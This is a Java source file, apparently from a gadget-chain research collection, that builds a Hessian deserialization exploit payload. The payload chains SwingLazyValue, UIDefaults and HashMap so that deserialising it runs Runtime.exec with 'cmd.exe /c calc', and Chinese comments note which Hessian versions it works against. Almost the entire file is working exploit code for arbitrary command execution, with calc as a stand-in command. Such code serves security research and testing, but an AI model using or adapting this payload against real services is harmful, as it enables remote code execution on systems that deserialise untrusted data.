package com.test.gadget.toStringBased;

import sun.swing.SwingLazyValue;
import tools.HessianTools;
import tools.ReflectTools;

import javax.swing.*;
import java.lang.reflect.Method;
import java.rmi.server.UID;
import java.util.HashMap;

public class HashTableEquals_get {
    public static void main(String[] args) throws Exception {
        Object payload = getPayload();
        byte[] bytes = HessianTools.hessian2Ser2bytes(payload);
        HessianTools.hessian2Deser(bytes);
    }

    public static Object getPayload() throws Exception {
        Method exec = Runtime.class.getDeclaredMethod("exec", String[].class);
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        // 不能直接传入Runtime，会找不到方法，因为要求参数类型为Object
        // hessian>=60最终不能调Runtime，因为反序列化后Runtime变成HashMap了
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke",
                new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{new String[]{"cmd.exe","/c","calc"}}}});

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("1diot9", swingLazyValue);

        UIDefaults uiDefaults1 = new UIDefaults();
        uiDefaults1.put("1diot9", swingLazyValue);

        HashMap<Object, Object> hashMap = ReflectTools.makeMap(uiDefaults, uiDefaults1);

        return hashMap;
    }
}
